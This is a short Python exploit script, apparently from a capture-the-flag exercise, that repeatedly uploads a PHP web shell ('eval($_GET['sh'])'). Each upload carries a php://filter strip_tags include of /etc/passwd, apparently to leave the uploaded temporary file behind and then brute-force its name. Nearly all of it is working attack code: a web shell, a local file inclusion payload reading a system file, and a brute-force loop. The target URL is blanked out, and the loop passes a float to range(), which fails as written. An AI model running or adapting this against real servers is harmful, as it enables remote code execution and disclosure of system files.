# python3
import requests
import string

charset = string.digits + string.ascii_letters

url = "xxxxxxxxxxxxxxxxxx"
shell = "<?php eval($_GET['sh']); ?>"
payload = {"file": "php://filter/string.strip_tags/resource=/etc/passwd"}
multi = {"tmp": ('shell.php', shell, 'application/x-php')}

def upload():
    try:
        res = requests.post(url, files=multi, data=payload)
    except Exception as e:
        print(e)

def main():
    times = len(charset) ** (6/2)  # six characters about "phpxxxxxx" in temporary filename
    for i in range(times):
        print("try for %d time in times %d" % (i, times))
        upload()

if __name__ == "__main__":
    main()
